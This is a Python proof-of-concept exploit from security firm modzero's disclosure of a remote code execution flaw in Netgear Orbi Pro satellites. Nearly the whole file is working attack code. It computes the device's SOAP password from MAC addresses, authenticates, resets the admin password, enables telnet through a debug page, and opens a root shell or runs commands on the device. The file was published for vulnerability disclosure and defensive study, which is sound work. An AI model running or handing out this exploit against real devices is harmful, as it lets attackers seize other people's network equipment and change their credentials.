#!python3

# Copyright (c) 2020, modzero AG, Thorsten Schroeder <ths@modzero.ch>
# See the LICENSE file for details.
#
# Netgear Orbi Pro Satellite  -  unauthorized remote code execution
# -- Proof of Concept exploit --
# CVSS:3.1 AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N -> 8.1
#
# This file implements all SOAP and connection-relevant functionality for the NETGEAR Orbi Pro system exploits.
#
# See https://www.modzero.com/advisories/Netgear-Orbi-Pro-Security-MZ-20-02.txt for details and
# background. Find all tools and exploits at https://github.com/modzero/MZ-20-02-NETGEAR-Orbi-Security
#
# 2020/01/05 - found issues
# 2020/01/06 - finished first poc exploit
# 2020/01/15 - finished draft report/security advisory
#

import base64
import datetime
import hashlib
import random
import re
import sys
import telnetlib
import time
import xml.dom.minidom

import netifaces
import requests
import urllib3
from getmac import get_mac_address

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class OrbiSoap:

    def __init__(self, host=None, session=None):

        self.sessionid = session
        self.host = host
        self.adminuser = "admin"
        self.soapuser = "orbi"

        self.url = "http://{}/soap/server_sa".format(host)
        self.user_agent = "Mozilla/5.0 (Windows NT 5.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0"

        # --------------------------------------------------------

        self.url = "http://{}/soap/server_sa".format(host)
        self.username = "orbi"

    def xml_get(self, xmldata, tag):

        # print(xmldata)
        doc = xml.dom.minidom.parseString(xmldata)
        items = doc.getElementsByTagName(tag)
        return items[0].childNodes[0].data

    def get_interfaces(self):

        iflist = list()
        idx = 0

        for i in netifaces.interfaces():

            try:
                ipaddr = netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr']
                macaddr = netifaces.ifaddresses(i)[netifaces.AF_LINK][0]['addr']
                if macaddr:
                    entry = {'idx': idx, 'if': i, 'ip': ipaddr, 'mac': macaddr}
                    iflist.append(entry)
                    idx += 1
            except:
                pass

        return iflist

    def generate_password(self):

        local_mac = None
        remote_mac = None

        local_ifs = self.get_interfaces()

        for _ in local_ifs:
            print("[{0}] {1:16}: {2} ({3})".format(_['idx'], _['ip'], _['mac'], _['if']))

        sel = input("[+] Select Interface: ")

        try:
            sel = int(sel.strip(' '))
        except Exception as e:
            print("[e] Error reading index: {}".format(e))
            sys.exit(1)

        for i in local_ifs:
            if sel == i['idx']:
                local_mac = i['mac']

        print("[*] Query Orbi Satellite at {0} via local interface {1}".format(self.host, local_mac))

        remote_mac = get_mac_address(ip=self.host, network_request=True)

        if not remote_mac:
            print("[!] Error. Unable to obtain mac address for target host {}".format(self.host))
            sys.exit(1)

        pw = None

        lm = local_mac.split(':')
        rm = remote_mac.split(':')

        lm = lm[3:6]
        rm = rm[3:6]

        pw = "NETGEAR_Orbi_{}_{}_password".format('_'.join(lm).upper(), '_'.join(rm).upper())

        # print("[D] using password: {}".format(pw))

        md = hashlib.md5()
        md.update(str.encode(pw))

        return md.hexdigest()

    def set_adminuser(self, user):

        self.adminuser = user

    def generate_sessionid(self):

        random.seed(time.time())
        sid = ''.join(random.choices(list("0123456789ABCDEF"), k=20))
        return sid

    def authenticate(self):

        if self.sessionid:
            return self.sessionid

        self.sessionid = self.generate_sessionid()
        # print("[D] new session id for host {}: {}".format(self.host, self.sessionid))

        password = self.generate_password()

        # print("[D] generated password for orbi system {}: {}".format(self.host, password))

        soap_urn = "urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate"

        xml_req = """<?xml version="1.0" encoding="UTF-8"?>
            <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
                <SOAP-ENV:Header>
                    <SessionID>
                        {0}
                    </SessionID>
                </SOAP-ENV:Header>
                <SOAP-ENV:Body>
                    <n0:Authenticate xmlns:n0="urn:NETGEAR-ROUTER:service:ParentalControl:1">
                        <NewUsername>{1}</NewUsername>
                        <NewPassword>{2}</NewPassword>
                        <ModelType>8</ModelType>
                    </n0:Authenticate>
                </SOAP-ENV:Body>
            </SOAP-ENV:Envelope>
        """.format(self.sessionid, self.soapuser, password)

        result = requests.post(self.url,
                               data=xml_req,
                               headers={
                                   "User-Agent": self.user_agent,
                                   "SOAPAction": soap_urn})

        try:
            rc = self.xml_get(result.text, "ResponseCode")
            # print("[D] auth response code: {}".format(rc))
        except Exception as e:
            print("[e] [HTTP status {} ({})] get response code from SOAP result failed: {}"
                  .format(result.status_code, result.reason, e))
            rc = "O_O"
            pass

        if rc == "000":
            return self.sessionid
        else:
            return None

    def configuration_started(self):

        soap_urn = "urn:NETGEAR-ROUTER:service:DeviceConfig:1#ConfigurationStarted"

        xml_req = """<?xml version="1.0" encoding="UTF-8"?>
            <SOAP-ENV:Envelope
                xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
                <SOAP-ENV:Header>
                    <SessionID>
                        {0}
                        </SessionID>
                    </SOAP-ENV:Header>
                <SOAP-ENV:Body>
                    <n0:ConfigurationStarted xmlns:n0="urn:NETGEAR-ROUTER:service:DeviceConfig:1">
                        <NewSessionID>
                            {0}
                            </NewSessionID>
                        </n0:ConfigurationStarted>
                    </SOAP-ENV:Body>
                </SOAP-ENV:Envelope>
        """.format(self.sessionid)

        result = requests.post(self.url,
                               data=xml_req,
                               headers={
                                   "User-Agent": self.user_agent,
                                   "SOAPAction": soap_urn})

        try:
            rc = self.xml_get(result.text, "ResponseCode")
        except Exception as e:
            print("[e] [HTTP status {} ({})] get response code from SOAP result failed: {}"
                  .format(result.status_code, result.reason, e))
            rc = "O_O"
            pass

        if rc == "000":
            return True

        return False

    def update_admin_password(self, password=None):

        soap_urn = "urn:NETGEAR-ROUTER:service:DeviceConfig:1#UpdateAdminPassword"
        xml_req = """<?xml version="1.0" encoding="UTF-8"?>
            <SOAP-ENV:Envelope
                xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
                <SOAP-ENV:Header>
                    <SessionID>
                        {0}
                    </SessionID>
                </SOAP-ENV:Header>
                <SOAP-ENV:Body>
                    <n0:UpdateAdminPassword xmlns:n0="urn:NETGEAR-ROUTER:service:DeviceConfig:1">
                        <NewUsername>{1}</NewUsername>
                        <NewPassword>{2}</NewPassword>
                    </n0:UpdateAdminPassword>
                </SOAP-ENV:Body>
            </SOAP-ENV:Envelope>
        """.format(self.sessionid, self.adminuser, password)

        result = requests.post(self.url,
                               data=xml_req,
                               headers={
                                   "User-Agent": self.user_agent,
                                   "SOAPAction": soap_urn})

        try:
            rc = self.xml_get(result.text, "ResponseCode")
        except Exception as e:
            print("[e] [HTTP status {} ({})] get response code from SOAP result failed: {}"
                  .format(result.status_code, result.reason, e))
            rc = "O_O"
            pass

        if rc == "000":
            return True

        return False

    def set_configuration_timestamp(self):

        soap_urn = "urn:NETGEAR-ROUTER:service:DeviceConfig:1#SetConfigurationTimestamp"
        xml_req = """<?xml version="1.0" encoding="UTF-8"?>
            <SOAP-ENV:Envelope
                xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
                <SOAP-ENV:Header>
                    <SessionID>
                        {0}
                    </SessionID>
                </SOAP-ENV:Header>
                <SOAP-ENV:Body>
                    <n0:SetConfigurationTimestamp xmlns:n0="urn:NETGEAR-ROUTER:service:DeviceConfig:1">
                        <NewTimestamp>{1}</NewTimestamp>
                    </n0:SetConfigurationTimestamp>
                </SOAP-ENV:Body>
            </SOAP-ENV:Envelope>
        """.format(self.sessionid, int(time.mktime(datetime.datetime.today().timetuple())))

        result = requests.post(self.url,
                               data=xml_req,
                               headers={
                                   "User-Agent": self.user_agent,
                                   "SOAPAction": soap_urn})

        try:
            rc = self.xml_get(result.text, "ResponseCode")
        except Exception as e:
            print("[e] [HTTP status {} ({})] get response code from SOAP result failed: {}"
                  .format(result.status_code, result.reason, e))
            rc = "O_O"
            pass

        if rc == "000":
            return True

        return False

    def configuration_finished(self):

        soap_urn = "urn:NETGEAR-ROUTER:service:DeviceConfig:1#ConfigurationFinished"
        xml_req = """<?xml version="1.0" encoding="UTF-8"?>
            <SOAP-ENV:Envelope
                xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
                <SOAP-ENV:Header>
                    <SessionID>
                        {0}
                    </SessionID>
                </SOAP-ENV:Header>
                <SOAP-ENV:Body>
                    <n0:ConfigurationFinished
                        xmlns:n0="urn:NETGEAR-ROUTER:service:DeviceConfig:1">
                        <NewStatus>
                            ChangesApplied
                        </NewStatus>
                    </n0:ConfigurationFinished>
                </SOAP-ENV:Body>
            </SOAP-ENV:Envelope>
        """.format(self.sessionid)

        result = requests.post(self.url,
                               data=xml_req,
                               headers={
                                   "User-Agent": self.user_agent,
                                   "SOAPAction": soap_urn})

        try:
            rc = self.xml_get(result.text, "ResponseCode")
        except Exception as e:
            print("[e] [HTTP status {} ({})] get response code from SOAP result failed: {}"
                  .format(result.status_code, result.reason, e))
            rc = "O_O"
            pass

        if rc == "000":
            return True

        return False

    def generic_soap_request(self, service, method):

        soap_urn = "urn:NETGEAR-ROUTER:service:{0}:1#{1}".format(service, method)
        xml_req = """<?xml version="1.0" encoding="UTF-8"?>
            <SOAP-ENV:Envelope
                xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
                <SOAP-ENV:Header>
                    <SessionID>
                        {0}
                    </SessionID>
                </SOAP-ENV:Header>
                <SOAP-ENV:Body>
                    <n0:{2} xmlns:n0="urn:NETGEAR-ROUTER:service:{1}:1">
                    </n0:{2}>
                </SOAP-ENV:Body>
            </SOAP-ENV:Envelope>
        """.format(self.sessionid, service, method)

        result = requests.post(self.url,
                               data=xml_req,
                               headers={
                                   "User-Agent": self.user_agent,
                                   "SOAPAction": soap_urn})

        try:
            rc = self.xml_get(result.text, "ResponseCode")
        except Exception as e:
            print("[e] [HTTP status {} ({})] get response code from SOAP result failed: {}"
                  .format(result.status_code, result.reason, e))
            rc = "O_O"
            pass

        return result.text


class OrbiTelnet:

    def __init__(self, host=None, login="admin", password=None):
        self.username = login
        self.password = password
        self.host = host

        self._telnet = None

        self.url = "https://{}/apply.cgi?/debug_detail.htm%20timestamp=666".format(host)
        self.basic_auth = "Basic {}".format(base64.b64encode("{}:{}"
                                                             .format(self.username, self.password)
                                                             .encode())
                                            .decode(encoding="ascii"))

    def _get_ts(self):

        data = requests.get("https://{}/debug_detail.htm".format(self.host),
                            headers={"Authorization": self.basic_auth},
                            verify=False)

        if data.status_code != 200:
            print("[e] Error getting session/timestamp from satellite: {} ({})!".format(data.status_code, data.reason))
            return False

        try:
            p = 'var ts="([^"]*)";'
            self.timestamp = re.findall(p, data.text)[0]
            print("[-] new session/timestamp: {}".format(self.timestamp))
            self.url = "https://{}/apply.cgi?/debug_detail.htm%20timestamp={}".format(self.host, self.timestamp)
        except Exception as e:
            print("[e] unable to get new session/timestamp value: {}".format(e))
            return False

        return True

    def start(self):

        if not self._get_ts():
            return False

        # start telnet

        data = requests.post(self.url,
                             data="submit_flag=debug_info&hid_telnet=1&enable_telnet=on",
                             headers={
                                 "Authorization": self.basic_auth,
                                 "Referer": "https://{}/debug_detail.htm".format(self.host)},
                             verify=False)

        if data.status_code == 200:
            print("[-] Success!".format(data.status_code, data.reason))
        else:
            print("[e] Error starting telnet service: {} ({})!".format(data.status_code, data.reason))
            return False

        return True

    def stop(self):

        if not self._get_ts():
            return False

        # stop telnet

        data = requests.post(self.url,
                             data="submit_flag=debug_info&hid_telnet=0",
                             headers={
                                 "Authorization": self.basic_auth,
                                 "Referer": "https://{}/debug_detail.htm".format(self.host)},
                             # proxies={"https": "http://127.0.0.1:8080", "http": "http://127.0.0.1:8080"},
                             verify=False)

        if data.status_code == 200:
            print("[e] Error stopping telnet service: {} ({})!".format(data.status_code, data.reason))
            return False

        return True

    def restart(self):

        self.stop()
        time.sleep(1)
        self.start()

    def login(self):

        # login to telnet
        self._telnet = telnetlib.Telnet(self.host, 23, 15)

        self._telnet.set_debuglevel(0)
        x = self._telnet.read_until(b"login: ")

        self._telnet.write(self.username.encode("ascii") + b"\n")
        x = self._telnet.read_until(b"Password: ")

        self._telnet.write(self.password.encode("ascii") + b"\n\n")
        x = self._telnet.read_until(b"root@SRS60:/#")

    def exec(self, cmd):
        # execute cmd
        x = self._telnet.read_until(b"root@SRS60:/#", 1)

        self._telnet.write("{}\n".format(cmd).encode())
        x = self._telnet.read_until(b"root@SRS60:/#")

        return x.decode("ascii")

    def close(self):

        self._telnet.close()

    def interactive(self):

        # interactive shell
        print("\n  ─────\n  R U N\n  C M D\n  ─────")

        try:
            self._telnet.mt_interact()
            x = self._telnet.read_all()
            self._telnet.close()
        except Exception as e:
            print("[e] telnet interactive exception: {}".format(e))
            pass
